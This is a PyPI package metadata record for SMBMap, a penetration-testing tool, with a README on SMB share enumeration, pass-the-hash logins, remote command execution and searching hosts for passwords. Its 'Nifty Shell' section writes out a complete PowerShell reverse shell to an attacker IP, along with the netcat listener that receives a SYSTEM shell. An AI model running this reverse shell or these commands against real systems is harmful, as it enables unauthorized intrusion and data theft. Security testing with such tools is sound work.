{
  "info": {
    "author": "ShawnDEvans",
    "author_email": "Shawn.Evans@knowledgeCG.com",
    "bugtrack_url": null,
    "classifiers": [
      "License :: OSI Approved :: GNU General Public License v3 (GPLv3)",
      "Operating System :: OS Independent",
      "Programming Language :: Python :: 3"
    ],
    "description": "# SMBMap\n\nSMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks.\n\nSome of the features have not been thoroughly tested, so changes will be forth coming as bugs are found. I only really find and fix the bugs while I'm on engagements, so progress is a bit slow. Any feedback or bug reports would be appreciated. It's definitely rough around the edges, but I'm just trying to pack in features at the moment. Version 2.0 should clean up the code a lotâ€¦.whenever that actually happens ;). Thanks for checking it out!!\n\nThere's a known oddity in the SMBServer component used for the file content search feature. For some reason it throws an exception in the threading library. It still works, but the error is annoying none the less.\n\n## Install Requirements\n```\nSMBMap has been updated to Python3!\n\n$ pip3 install smbmap\n```\n\n## Features:\n- Pass-the-Hash Support\n- File upload/download/delete\n- Permission enumeration (writable share, meet Metasploit)\n- Remote Command Execution\n- Distrubted file content searching (beta!)\n- File name matching (with an auto downoad capability)\n\n## Help\n```\n    ________  ___      ___  _______   ___      ___       __         _______\n   /\"       )|\"  \\    /\"  ||   _  \"\\ |\"  \\    /\"  |     /\"\"\\       |   __ \"\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /\n   /\" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n -----------------------------------------------------------------------------\n     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com\n                     https://github.com/ShawnDEvans/smbmap\n\noptional arguments:\n  -h, --help            show this help message and exit\n\nMain arguments:\n  -H HOST               IP of host\n  --host-file FILE      File containing a list of hosts\n  -u USERNAME           Username, if omitted null session assumed\n  -p PASSWORD           Password or NTLM hash\n  --prompt              Prompt for a password\n  -s SHARE              Specify a share (default C$), ex 'C$'\n  -d DOMAIN             Domain name (default WORKGROUP)\n  -P PORT               SMB port (default 445)\n  -v                    Return the OS version of the remote host\n  --admin               Just report if the user is an admin\n  --no-banner           Removes the banner from the top of the output\n  --no-color            Removes color from output\n  --no-update           Removes \"Working on it...\" update message from output\n\nCommand Execution:\n  Options for executing commands on the specified host\n\n  -x COMMAND            Execute a command ex. 'ipconfig /all'\n  --mode CMDMODE        Set the execution method, wmi or psexec, default wmi\n\nShard drive Search:\n  Options for searching/enumerating the share of the specified host(s)\n\n  -L                    List all drives on the specified host, requires ADMIN\n                        rights.\n  -R [PATH]             Recursively list dirs, and files (no share\\path lists\n                        ALL shares), ex. 'C$\\Finance'\n  -r [PATH]             List contents of directory, default is to list root of\n                        all shares, ex. -r 'C$\\Documents and\n                        Settings\\Administrator\\Documents'\n  -A PATTERN            Define a file name pattern (regex) that auto downloads\n                        a file on a match (requires -R or -r), not case\n                        sensitive, ex '(web|global).(asax|config)'\n  -g FILE               Output to a file in a grep friendly format, used with\n                        -r or -R (otherwise it outputs nothing), ex -g\n                        grep_out.txt\n  --csv FILE            Output to a CSV file, ex --csv shares.csv\n  --dir-only            List only directories, ommit files.\n  --no-write-check      Skip check to see if drive grants WRITE access.\n  -q                    Quiet verbose output. Only shows shares you have READ\n                        or WRITE on, and suppresses file listing when\n                        performing a search (-A).\n  --depth DEPTH         Traverse a directory tree to a specific depth. Default\n                        is 5.\n  --exclude SHARE [SHARE ...]\n                        Exclude share(s) from searching and listing, ex.\n                        --exclude ADMIN$ C$'\n\nFile Content Search:\n  Options for searching the content of files (must run as root), kind of experimental\n\n  -F PATTERN            File content search, -F '[Pp]assword' (requires admin\n                        access to execute commands, and PowerShell on victim\n                        host)\n  --search-path PATH    Specify drive/path to search (used with -F, default\n                        C:\\Users), ex 'D:\\HR\\'\n  --search-timeout TIMEOUT\n                        Specifcy a timeout (in seconds) before the file search\n                        job gets killed. Default is 300 seconds.\n\nFilesystem interaction:\n  Options for interacting with the specified host's filesystem\n\n  --download PATH       Download a file from the remote system,\n                        ex.'C$\\temp\\passwords.txt'\n  --upload SRC DST      Upload a file to the remote system ex.\n                        '/tmp/payload.exe C$\\temp\\payload.exe'\n  --delete PATH TO FILE\n                        Delete a remote file, ex. 'C$\\temp\\msf.exe'\n  --skip                Skip delete file confirmation prompt\n\nExamples:\n\n$ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1\n$ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20\n$ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -H 10.1.3.30 -x 'net group \"Domain Admins\" /domain'\n```\n\n## Default Output:\n```\n$ ./smbmap.py -H 192.168.12.123 -u administrator -p asdf1234\n[+] Finding open SMB ports....\n[+] User SMB session established on 192.168.86.39...\n[+] IP: 192.168.86.39:445\tName: biffhenderson-pc.lan\n\tDisk                                Permissions\t    Comment\n\t----                                -----------\t    -------\n\tADMIN$                              READ, WRITE\t    Remote Admin\n\tC$                                  READ, WRITE\t    Default share\n\tIPC$                                NO ACCESS\t    Remote IPC\n\tUsers                               READ, WRITE\n```\n\n## Command execution:\n```\n$ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group \"Domain Admins\" /domain' -H 192.168.2.50\n[+] Finding open SMB ports....\n[+] User SMB session established...\n[+] IP: 192.168.2.50:445        Name: unknown\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nabcadmin\nThe command completed successfully.\n```\n\n## Non recursive path listing (ls):\n```\n$ python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\\Users'\n[+] Finding open SMB ports....\n[+] User SMB session established...\n[+] IP: 172.16.0.24:445 Name: 172.16.0.24\n    Disk                                                    Permissions\n    ----                                                    -----------\n    C$                                                      READ, WRITE\n    .Users\n    dw--w--w--                0 Wed Apr 29 13:15:25 2015    .\n    dw--w--w--                0 Wed Apr 29 13:15:25 2015    ..\n    dr--r--r--                0 Wed Apr 22 14:50:36 2015    Administrator\n    dr--r--r--                0 Thu Apr  9 14:46:57 2015    All Users\n    dw--w--w--                0 Thu Apr  9 14:46:49 2015    Default\n    dr--r--r--                0 Thu Apr  9 14:46:57 2015    Default User\n    fr--r--r--              174 Thu Apr  9 14:44:01 2015    desktop.ini\n    dw--w--w--                0 Thu Apr  9 14:46:49 2015    Public\n    dr--r--r--                0 Wed Apr 22 13:33:01 2015    wingus\n```\n\n## File Content Searching:\n```\n$ python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'\n[+] Finding open SMB ports....\n[+] User SMB session established on 192.168.0.99...\n[+] User SMB session established on 192.168.0.85...\n[+] User SMB session established on 192.168.0.89...\n[+] File search started on 1 hosts...this could take a while\n[+] Job 4650e5a97b9f4ca884613f4b started on 192.168.0.99, result will be stored at C:\\Temp\\4650e5a97b9f4ca884613f4b.txt\n[+] File search started on 2 hosts...this could take a while\n[+] Job e0c822a802eb455f96259f33 started on 192.168.0.85, result will be stored at C:\\Windows\\TEMP\\e0c822a802eb455f96259f33.txt\n[+] File search started on 3 hosts...this could take a while\n[+] Job 0a5d352bf2bd4e288e0f8f36 started on 192.168.0.89, result will be stored at C:\\Temp\\0a5d352bf2bd4e288e0f8f36.txt\n[+] Grabbing search results, be patient, share drives tend to be big...\n[+] Job 1 of 3 completed on 192.168.0.85...\n[+] File successfully deleted: C$\\Windows\\TEMP\\e0c822a802eb455f96259f33.txt\n[+] Job 2 of 3 completed on 192.168.0.89...\n[+] File successfully deleted: C$\\Temp\\0a5d352bf2bd4e288e0f8f36.txt\n[+] Job 3 of 3 completed on 192.168.0.99...\n[+] File successfully deleted: C$\\Temp\\4650e5a97b9f4ca884613f4b.txt\n[+] All jobs complete\nHost: 192.168.0.85         Pattern: [1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]\nNo matching patterns found\n\nHost: 192.168.0.89         Pattern: [1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]\nC:\\Users\\terdf\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\JY5MGKVO\\salesmaps[1].htm\nC:\\Users\\terdf\\OldFiles\\Cache_2013522\\Content.IE5\\JY5MGKVO\\salesmaps[1].htm\n\nHost: 192.168.0.99         Pattern: [1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]\nC:\\Users\\biffh\\AppData\\Local\\Microsoft\\Internet Explorer\\DOMStore\\L7W17OPZ\\static.olark[1].xml\nC:\\Users\\biffh\\AppData\\Local\\Temp\\Temporary Internet Files\\Content.IE5\\MIY2POGJ\\validation[2].js\nC:\\Users\\biffh\\AppData\\Local\\Temp\\Temporary Internet Files\\Content.IE5\\NV1MNBWA\\Docs[1].htm\nC:\\Users\\biffh\\AppData\\Local\\Temp\\Temporary Internet Files\\Content.IE5\\NV1MNBWA\\Salesmaps[1].htm\n```\n\n## Drive Listing:\nThis feature was added to complement the file content searching feature\n\n```\n$ python smbmap.py -H 192.168.1.24 -u Administrator -p 'R33nisP!nckle' -L\n[!] Missing domain...defaulting to WORKGROUP\n[+] Finding open SMB ports....\n[+] User SMB session established...\n[+] IP: 192.168.1.24:445 Name: unknown\n[+] Host 192.168.1.24 Local Drives: C:\\ D:\\\n[+] Host 192.168.1.24 Net Drive(s):\n    E:      \\\\vboxsrv\\Public      VirtualBox Shared Folders\n```\n\n## Nifty Shell:\nRun Powershell Script on Victim SMB host (change the IP in the code to your IP addres, i.e where the shell connects back to)\n```\n$ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -H 192.168.2.50 -x 'powershell -command \"function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=\"\"\"\"192.168.0.153\"\"\"\"; $port=\"\"\"\"4445\"\"\"\";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=\"\"\"\"cmd.exe\"\"\"\"  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=\"\"\"\" \"\"\"\"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};\"'\n[+] Finding open SMB ports....\n[+] User SMB session established...\n[+] IP: 192.168.2.50:445        Name: unkown\n[!] Error encountered, sharing violation, unable to retrieve output\n```\n\n## Attackers Netcat Listener:\n```\n$ nc -l 4445\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32>whoami\n nt authority\\system\n```\n\n\n",
    "description_content_type": "text/markdown",
    "docs_url": null,
    "download_url": "",
    "downloads": {
      "last_day": -1,
      "last_month": -1,
      "last_week": -1
    },
    "home_page": "https://github.com/ShawnDEvans/smbmap",
    "keywords": "",
    "license": "",
    "maintainer": "",
    "maintainer_email": "",
    "name": "smbmap",
    "package_url": "https://pypi.org/project/smbmap/",
    "platform": null,
    "project_url": "https://pypi.org/project/smbmap/",
    "project_urls": {
      "Bug Tracker": "https://github.com/ShawnDEvans/smbmap/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc",
      "Homepage": "https://github.com/ShawnDEvans/smbmap"
    },
    "release_url": "https://pypi.org/project/smbmap/1.8.2/",
    "requires_dist": null,
    "requires_python": ">=3.6",
    "summary": "SMBMap is a handy SMB enumeration tool",
    "version": "1.8.2",
    "yanked": false,
    "yanked_reason": null
  },
  "last_serial": 17430670,
  "releases": {
    "1.8.2": [
      {
        "comment_text": "",
        "digests": {
          "blake2b_256": "b78d7af9153e72fc46352ba9d95752cd78a20cd1ae66a7deca324a9405a8bfd1",
          "md5": "383ff51cfd32d9c7e9d964abb159bcf8",
          "sha256": "8456728d9cc304938b26aa557242775d704afcf2a70c4bfd29e9be52b5f0b3b0"
        },
        "downloads": -1,
        "filename": "smbmap-1.8.2.tar.gz",
        "has_sig": false,
        "md5_digest": "383ff51cfd32d9c7e9d964abb159bcf8",
        "packagetype": "sdist",
        "python_version": "source",
        "requires_python": ">=3.6",
        "size": 37282,
        "upload_time": "2023-03-24T12:23:23",
        "upload_time_iso_8601": "2023-03-24T12:23:23.082107Z",
        "url": "https://files.pythonhosted.org/packages/b7/8d/7af9153e72fc46352ba9d95752cd78a20cd1ae66a7deca324a9405a8bfd1/smbmap-1.8.2.tar.gz",
        "yanked": false,
        "yanked_reason": null
      }
    ]
  },
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "b78d7af9153e72fc46352ba9d95752cd78a20cd1ae66a7deca324a9405a8bfd1",
        "md5": "383ff51cfd32d9c7e9d964abb159bcf8",
        "sha256": "8456728d9cc304938b26aa557242775d704afcf2a70c4bfd29e9be52b5f0b3b0"
      },
      "downloads": -1,
      "filename": "smbmap-1.8.2.tar.gz",
      "has_sig": false,
      "md5_digest": "383ff51cfd32d9c7e9d964abb159bcf8",
      "packagetype": "sdist",
      "python_version": "source",
      "requires_python": ">=3.6",
      "size": 37282,
      "upload_time": "2023-03-24T12:23:23",
      "upload_time_iso_8601": "2023-03-24T12:23:23.082107Z",
      "url": "https://files.pythonhosted.org/packages/b7/8d/7af9153e72fc46352ba9d95752cd78a20cd1ae66a7deca324a9405a8bfd1/smbmap-1.8.2.tar.gz",
      "yanked": false,
      "yanked_reason": null
    }
  ],
  "vulnerabilities": []
}